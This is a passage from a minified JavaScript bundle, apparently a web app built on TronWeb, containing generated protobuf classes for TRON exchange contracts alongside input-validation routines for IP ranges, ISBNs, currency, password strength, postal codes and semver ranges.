                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ExchangeCreateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ExchangeCreateContract;
                return TronWebProto.ExchangeCreateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ExchangeCreateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setFirstTokenId(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setFirstTokenBalance(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setSecondTokenId(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setSecondTokenBalance(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ExchangeCreateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ExchangeCreateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getFirstTokenId_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getFirstTokenBalance()) && t.writeInt64(3, r),
                (r = e.getSecondTokenId_asU8()).length > 0 && t.writeBytes(4, r),
                0 !== (r = e.getSecondTokenBalance()) && t.writeInt64(5, r)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getFirstTokenId())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getFirstTokenId())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.setFirstTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getFirstTokenBalance = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.setFirstTokenBalance = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getSecondTokenId())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getSecondTokenId())
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.setSecondTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.getSecondTokenBalance = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.ExchangeCreateContract.prototype.setSecondTokenBalance = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeInjectContract.prototype.toObject = function(e) {
                return TronWebProto.ExchangeInjectContract.toObject(e, this)
            }
            ,
            TronWebProto.ExchangeInjectContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    exchangeId: n.Message.getFieldWithDefault(t, 2, 0),
                    tokenId: t.getTokenId_asB64(),
                    quant: n.Message.getFieldWithDefault(t, 4, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ExchangeInjectContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ExchangeInjectContract;
                return TronWebProto.ExchangeInjectContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ExchangeInjectContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setExchangeId(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setTokenId(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setQuant(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ExchangeInjectContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ExchangeInjectContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getExchangeId()) && t.writeInt64(2, r),
                (r = e.getTokenId_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getQuant()) && t.writeInt64(4, r)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getExchangeId = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.setExchangeId = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getTokenId = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.setTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.getQuant = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.ExchangeInjectContract.prototype.setQuant = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeWithdrawContract.prototype.toObject = function(e) {
                return TronWebProto.ExchangeWithdrawContract.toObject(e, this)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    exchangeId: n.Message.getFieldWithDefault(t, 2, 0),
                    tokenId: t.getTokenId_asB64(),
                    quant: n.Message.getFieldWithDefault(t, 4, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ExchangeWithdrawContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ExchangeWithdrawContract;
                return TronWebProto.ExchangeWithdrawContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setExchangeId(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setTokenId(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setQuant(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ExchangeWithdrawContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ExchangeWithdrawContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getExchangeId()) && t.writeInt64(2, r),
                (r = e.getTokenId_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getQuant()) && t.writeInt64(4, r)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getExchangeId = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.setExchangeId = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getTokenId = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.setTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.getQuant = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.ExchangeWithdrawContract.prototype.setQuant = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeTransactionContract.prototype.toObject = function(e) {
                return TronWebProto.ExchangeTransactionContract.toObject(e, this)
            }
            ,
            TronWebProto.ExchangeTransactionContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    exchangeId: n.Message.getFieldWithDefault(t, 2, 0),
                    tokenId: t.getTokenId_asB64(),
                    quant: n.Message.getFieldWithDefault(t, 4, 0),
                    expected: n.Message.getFieldWithDefault(t, 5, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ExchangeTransactionContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ExchangeTransactionContract;
                return TronWebProto.ExchangeTransactionContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ExchangeTransactionContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setExchangeId(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setTokenId(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setQuant(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setExpected(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ExchangeTransactionContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ExchangeTransactionContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getExchangeId()) && t.writeInt64(2, r),
                (r = e.getTokenId_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getQuant()) && t.writeInt64(4, r),
                0 !== (r = e.getExpected()) && t.writeInt64(5, r)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getExchangeId = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.setExchangeId = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getTokenId = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getTokenId_asB64 = function() {
                return n.Message.bytesAsB64(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getTokenId_asU8 = function() {
                return n.Message.bytesAsU8(this.getTokenId())
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.setTokenId = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getQuant = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.setQuant = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.getExpected = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.ExchangeTransactionContract.prototype.setExpected = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        3192: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                var r = (null === t || void 0 === t ? void 0 : t.comparisonDate) || t || Date().toString()
                  , n = (0,
                o.default)(r)
                  , i = (0,
                o.default)(e);
                return !!(i && n && i > n)
            }
            ;
            var n, o = (n = r(7961)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3212: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "";
                (0,
                n.default)(e);
                var r = e.split("/");
                if (2 !== r.length)
                    return !1;
                if (!s.test(r[1]))
                    return !1;
                if (r[1].length > 1 && r[1].startsWith("0"))
                    return !1;
                if (!(0,
                o.default)(r[0], t))
                    return !1;
                var i = null;
                switch (String(t)) {
                case "4":
                    i = a;
                    break;
                case "6":
                    i = c;
                    break;
                default:
                    i = (0,
                    o.default)(r[0], "6") ? c : a
                }
                return r[1] <= i && r[1] >= 0
            }
            ;
            var n = i(r(8804))
              , o = i(r(6581));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = /^\d{1,3}$/
              , a = 32
              , c = 128;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3298: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                var r, n;
                (0,
                o.default)(e),
                "object" === i(t) ? (r = t.min || 0,
                n = t.max) : (r = arguments[1],
                n = arguments[2]);
                var s = encodeURI(e).split(/%..|./).length - 1;
                return s >= r && ("undefined" === typeof n || s <= n)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            function i(e) {
                return i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                }
                : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                }
                ,
                i(e)
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3338: e => {
            const t = "object" === typeof process && {
                NODE_ENV: "production",
                PUBLIC_URL: "",
                WDS_SOCKET_HOST: void 0,
                WDS_SOCKET_PATH: void 0,
                WDS_SOCKET_PORT: void 0,
                FAST_REFRESH: !0
            }.NODE_DEBUG && /\bsemver\b/i.test({
                NODE_ENV: "production",
                PUBLIC_URL: "",
                WDS_SOCKET_HOST: void 0,
                WDS_SOCKET_PATH: void 0,
                WDS_SOCKET_PORT: void 0,
                FAST_REFRESH: !0
            }.NODE_DEBUG) ? function() {
                for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                    t[r] = arguments[r];
                return console.error("SEMVER", ...t)
            }
            : () => {}
            ;
            e.exports = t
        }
        ,
        3411: (e, t, r) => {
            const n = r(9398)
              , o = r(77)
              , i = r(1166);
            e.exports = (e, t) => {
                e = new o(e,t);
                let r = new n("0.0.0");
                if (e.test(r))
                    return r;
                if (r = new n("0.0.0-0"),
                e.test(r))
                    return r;
                r = null;
                for (let o = 0; o < e.set.length; ++o) {
                    const t = e.set[o];
                    let s = null;
                    t.forEach((e => {
                        const t = new n(e.semver.version);
                        switch (e.operator) {
                        case ">":
                            0 === t.prerelease.length ? t.patch++ : t.prerelease.push(0),
                            t.raw = t.format();
                        case "":
                        case ">=":
                            s && !i(t, s) || (s = t);
                            break;
                        case "<":
                        case "<=":
                            break;
                        default:
                            throw new Error("Unexpected operation: ".concat(e.operator))
                        }
                    }
                    )),
                    !s || r && !i(r, s) || (r = s)
                }
                return r && e.test(r) ? r : null
            }
        }
        ,
        3496: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function e(t, r) {
                (0,
                o.default)(t);
                var n = String((null === r || void 0 === r ? void 0 : r.version) || r);
                if (!(null !== r && void 0 !== r && r.version || r))
                    return e(t, {
                        version: 10
                    }) || e(t, {
                        version: 13
                    });
                var c = t.replace(/[\s-]+/g, "")
                  , l = 0;
                if ("10" === n) {
                    if (!i.test(c))
                        return !1;
                    for (var u = 0; u < n - 1; u++)
                        l += (u + 1) * c.charAt(u);
                    if ("X" === c.charAt(9) ? l += 100 : l += 10 * c.charAt(9),
                    l % 11 === 0)
                        return !0
                } else if ("13" === n) {
                    if (!s.test(c))
                        return !1;
                    for (var d = 0; d < 12; d++)
                        l += a[d % 2] * c.charAt(d);
                    if (c.charAt(12) - (10 - l % 10) % 10 === 0)
                        return !0
                }
                return !1
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^(?:[0-9]{9}X|[0-9]{10})$/
              , s = /^(?:[0-9]{13})$/
              , a = [1, 3];
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3553: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                (0,
                o.default)(e);
                var r = i;
                if (r = t.require_hyphen ? r.replace("?", "") : r,
                !(r = t.case_sensitive ? new RegExp(r) : new RegExp(r,"i")).test(e))
                    return !1;
                for (var n = e.replace("-", "").toUpperCase(), s = 0, a = 0; a < n.length; a++) {
                    var c = n[a];
                    s += ("X" === c ? 10 : +c) * (8 - a)
                }
                return s % 11 === 0
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = "^\\d{4}-?\\d{3}[\\dX]$";
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3568: (e, t, r) => {
            const n = r(1521);
            e.exports = (e, t, r) => n(e, t, "<", r)
        }
        ,
        3583: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                return (0,
                o.default)(e),
                function(e) {
                    var t = "\\d{".concat(e.digits_after_decimal[0], "}");
                    e.digits_after_decimal.forEach((function(e, r) {
                        0 !== r && (t = "".concat(t, "|\\d{").concat(e, "}"))
                    }
                    ));
                    var r = "(".concat(e.symbol.replace(/\W/, (function(e) {
                        return "\\".concat(e)
                    }
                    )), ")").concat(e.require_symbol ? "" : "?")
                      , n = "-?"
                      , o = "[1-9]\\d{0,2}(\\".concat(e.thousands_separator, "\\d{3})*")
                      , i = "(".concat(["0", "[1-9]\\d*", o].join("|"), ")?")
                      , s = "(\\".concat(e.decimal_separator, "(").concat(t, "))").concat(e.require_decimal ? "" : "?")
                      , a = i + (e.allow_decimal || e.require_decimal ? s : "");
                    e.allow_negatives && !e.parens_for_negatives && (e.negative_sign_after_digits ? a += n : e.negative_sign_before_digits && (a = n + a));
                    e.allow_negative_sign_placeholder ? a = "( (?!\\-))?".concat(a) : e.allow_space_after_symbol ? a = " ?".concat(a) : e.allow_space_after_digits && (a += "( (?!$))?");
                    e.symbol_after_digits ? a += r : a = r + a;
                    e.allow_negatives && (e.parens_for_negatives ? a = "(\\(".concat(a, "\\)|").concat(a, ")") : e.negative_sign_before_digits || e.negative_sign_after_digits || (a = n + a));
                    return new RegExp("^(?!-? )(?=.*\\d)".concat(a, "$"))
                }(t = (0,
                n.default)(t, s)).test(e)
            }
            ;
            var n = i(r(3975))
              , o = i(r(8804));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = {
                symbol: "$",
                require_symbol: !1,
                allow_space_after_symbol: !1,
                symbol_after_digits: !1,
                allow_negatives: !0,
                parens_for_negatives: !1,
                negative_sign_before_digits: !1,
                negative_sign_after_digits: !1,
                allow_negative_sign_placeholder: !1,
                thousands_separator: ",",
                decimal_separator: ".",
                allow_decimal: !0,
                require_decimal: !1,
                digits_after_decimal: [2],
                allow_space_after_digits: !1
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3694: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
                (0,
                o.default)(e);
                var r = function(e) {
                    var t = function(e) {
                        var t = {};
                        return Array.from(e).forEach((function(e) {
                            t[e] ? t[e] += 1 : t[e] = 1
                        }
                        )),
                        t
                    }(e)
                      , r = {
                        length: e.length,
                        uniqueChars: Object.keys(t).length,
                        uppercaseCount: 0,
                        lowercaseCount: 0,
                        numberCount: 0,
                        symbolCount: 0
                    };
                    return Object.keys(t).forEach((function(e) {
                        s.test(e) ? r.uppercaseCount += t[e] : a.test(e) ? r.lowercaseCount += t[e] : c.test(e) ? r.numberCount += t[e] : l.test(e) && (r.symbolCount += t[e])
                    }
                    )),
                    r
                }(e);
                if ((t = (0,
                n.default)(t || {}, u)).returnScore)
                    return function(e, t) {
                        var r = 0;
                        r += e.uniqueChars * t.pointsPerUnique,
                        r += (e.length - e.uniqueChars) * t.pointsPerRepeat,
                        e.lowercaseCount > 0 && (r += t.pointsForContainingLower);
                        e.uppercaseCount > 0 && (r += t.pointsForContainingUpper);
                        e.numberCount > 0 && (r += t.pointsForContainingNumber);
                        e.symbolCount > 0 && (r += t.pointsForContainingSymbol);
                        return r
                    }(r, t);
                return r.length >= t.minLength && r.lowercaseCount >= t.minLowercase && r.uppercaseCount >= t.minUppercase && r.numberCount >= t.minNumbers && r.symbolCount >= t.minSymbols
            }
            ;
            var n = i(r(3975))
              , o = i(r(8804));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = /^[A-Z]$/
              , a = /^[a-z]$/
              , c = /^[0-9]$/
              , l = /^[-#!$@\xa3%^&*()_+|~=`{}\[\]:";'<>?,.\/\\ ]$/
              , u = {
                minLength: 8,
                minLowercase: 1,
                minUppercase: 1,
                minNumbers: 1,
                minSymbols: 1,
                returnScore: !1,
                pointsPerUnique: 1,
                pointsPerRepeat: .5,
                pointsForContainingLower: 10,
                pointsForContainingUpper: 10,
                pointsForContainingNumber: 10,
                pointsForContainingSymbol: 10
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3708: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")();
            o.exportSymbol("proto.google.protobuf.Any", null, i),
            proto.google.protobuf.Any = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(proto.google.protobuf.Any, n.Message),
            o.DEBUG && !COMPILED && (proto.google.protobuf.Any.displayName = "proto.google.protobuf.Any"),
            n.Message.GENERATE_TO_OBJECT && (proto.google.protobuf.Any.prototype.toObject = function(e) {
                return proto.google.protobuf.Any.toObject(e, this)
            }
            ,
            proto.google.protobuf.Any.toObject = function(e, t) {
                var r = {
                    typeUrl: n.Message.getFieldWithDefault(t, 1, ""),
                    value: t.getValue_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            proto.google.protobuf.Any.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new proto.google.protobuf.Any;
                return proto.google.protobuf.Any.deserializeBinaryFromReader(r, t)
            }
            ,
            proto.google.protobuf.Any.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readString();
                        e.setTypeUrl(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setValue(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            proto.google.protobuf.Any.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return proto.google.protobuf.Any.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            proto.google.protobuf.Any.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getTypeUrl()).length > 0 && t.writeString(1, r),
                (r = e.getValue_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            proto.google.protobuf.Any.prototype.getTypeUrl = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            proto.google.protobuf.Any.prototype.setTypeUrl = function(e) {
                return n.Message.setProto3StringField(this, 1, e)
            }
            ,
            proto.google.protobuf.Any.prototype.getValue = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            proto.google.protobuf.Any.prototype.getValue_asB64 = function() {
                return n.Message.bytesAsB64(this.getValue())
            }
            ,
            proto.google.protobuf.Any.prototype.getValue_asU8 = function() {
                return n.Message.bytesAsU8(this.getValue())
            }
            ,
            proto.google.protobuf.Any.prototype.setValue = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            o.object.extend(t, proto.google.protobuf),
            proto.google.protobuf.Any.prototype.getTypeName = function() {
                return this.getTypeUrl().split("/").pop()
            }
            ,
            proto.google.protobuf.Any.prototype.pack = function(e, t, r) {
                r || (r = "type.googleapis.com/"),
                "/" != r.substr(-1) ? this.setTypeUrl(r + "/" + t) : this.setTypeUrl(r + t),
                this.setValue(e)
            }
            ,
            proto.google.protobuf.Any.prototype.unpack = function(e, t) {
                return this.getTypeName() == t ? e(this.getValue_asU8()) : null
            }
        }
        ,
        3710: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                o.default)(e),
                t in l)
                    return l[t].test(e);
                if ("any" === t) {
                    for (var r in l) {
                        if (l.hasOwnProperty(r))
                            if (l[r].test(e))
                                return !0
                    }
                    return !1
                }
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ,
            t.locales = void 0;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^\d{3}$/
              , s = /^\d{4}$/
              , a = /^\d{5}$/
              , c = /^\d{6}$/
              , l = {
                AD: /^AD\d{3}$/,
                AT: s,
                AU: s,
                AZ: /^AZ\d{4}$/,
                BA: /^([7-8]\d{4}$)/,
                BE: s,
                BG: s,
                BR: /^\d{5}-\d{3}$/,
                BY: /^2[1-4]\d{4}$/,
                CA: /^[ABCEGHJKLMNPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][\s\-]?\d[ABCEGHJ-NPRSTV-Z]\d$/i,
                CH: s,
                CN: /^(0[1-7]|1[012356]|2[0-7]|3[0-6]|4[0-7]|5[1-7]|6[1-7]|7[1-5]|8[1345]|9[09])\d{4}$/,
                CZ: /^\d{3}\s?\d{2}$/,
                DE: a,
                DK: s,
                DO: a,
                DZ: a,
                EE: a,
                ES: /^(5[0-2]{1}|[0-4]{1}\d{1})\d{3}$/,
